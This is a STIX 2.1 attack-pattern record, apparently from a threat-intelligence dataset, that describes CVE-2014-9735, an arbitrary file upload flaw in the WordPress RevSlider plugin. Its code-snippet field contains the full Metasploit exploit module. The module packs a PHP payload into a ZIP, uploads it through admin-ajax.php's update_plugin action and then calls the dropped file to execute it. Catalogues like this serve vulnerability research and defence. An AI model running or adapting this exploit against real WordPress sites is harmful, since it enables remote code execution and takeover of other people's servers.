{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0ced4521-fbdf-458e-b0a2-216802d1f508",
    "created": "2024-08-14T17:12:22.882897Z",
    "modified": "2024-08-14T17:12:22.882901Z",
    "name": "WordPress RevSlider File Upload and Execute Vulnerability",
    "description": " This module exploits an arbitrary PHP code upload vulnerability in the WordPress ThemePunch Slider Revolution (RevSlider) plugin, versions 3.0.95 and prior. The vulnerability allows for arbitrary file upload and remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_revslider_upload_execute.rb",
            "external_id": "wp_revslider_upload_execute.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9735"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7954"
        },
        {
            "source_name": "reference",
            "url": "https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress RevSlider File Upload and Execute Vulnerability',\n      'Description'    => %q{\n        This module exploits an arbitrary PHP code upload vulnerability in the\n        WordPress ThemePunch Slider Revolution (RevSlider) plugin, versions 3.0.95\n        and prior. The vulnerability allows for arbitrary file upload and remote code execution.\n      },\n      'Author'         =>\n        [\n          'Simo Ben youssef', # Vulnerability discovery\n          'Tom Sellers <tom[at]fadedcode.net>'  # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2014-9735'],\n          ['OSVDB', '115118'],\n          ['EDB', '35385'],\n          ['WPVDB', '7954'],\n          ['URL', 'https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/']\n        ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['ThemePunch Revolution Slider (revslider) 3.0.95', {}]],\n      'DisclosureDate' => '2014-11-26',\n      'DefaultTarget'  => 0)\n    )\n  end\n\n  def check\n    release_log_url = normalize_uri(wordpress_url_plugins, 'revslider', 'release_log.txt')\n    check_version_from_custom_file(release_log_url, /^\\s*(?:version)\\s*(\\d{1,2}\\.\\d{1,2}(?:\\.\\d{1,2})?).*$/mi, '3.0.96')\n  end\n\n  def exploit\n    php_pagename = rand_text_alpha(4 + rand(4)) + '.php'\n\n    # Build the zip\n    payload_zip = Rex::Zip::Archive.new\n    # If the filename in the zip is revslider.php it will be automatically\n    # executed but it will break the plugin and sometimes WordPress\n    payload_zip.add_file('revslider/' + php_pagename, payload.encoded)\n\n    # Build the POST body\n    data = Rex::MIME::Message.new\n    data.add_part('revslider_ajax_action', nil, nil, 'form-data; name=\"action\"')\n    data.add_part('update_plugin', nil, nil, 'form-data; name=\"client_action\"')\n    data.add_part(payload_zip.pack, 'application/x-zip-compressed', 'binary', \"form-data; name=\\\"update_file\\\"; filename=\\\"revslider.zip\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi(\n      'uri'     => wordpress_url_admin_ajax,\n      'method'  => 'POST',\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => post_data\n    )\n\n    if res\n      if res.code == 200 && res.body =~ /Update in progress/\n        # The payload itself almost never deleted, try anyway\n        register_files_for_cleanup(php_pagename)\n        # This normally works\n        register_files_for_cleanup('../revslider.zip')\n        final_uri = normalize_uri(wordpress_url_plugins, 'revslider', 'temp', 'update_extract', 'revslider', php_pagename)\n        print_good(\"Our payload is at: #{final_uri}\")\n        print_status(\"Calling payload...\")\n        send_request_cgi(\n          'uri'     => normalize_uri(final_uri),\n          'timeout' => 5\n        )\n      elsif res.code == 200 && res.body =~ /^0$/\n        # admin-ajax.php returns 0 if the 'action' 'revslider_ajax_action' is unknown\n        fail_with(Failure::NotVulnerable, \"#{peer} - Target not vulnerable or the plugin is deactivated\")\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to deploy payload, server returned #{res.code}\")\n      end\n    else\n      fail_with(Failure::Unknown, 'ERROR')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-26",
    "x_mitre_platforms": [
        "php'"
    ]
}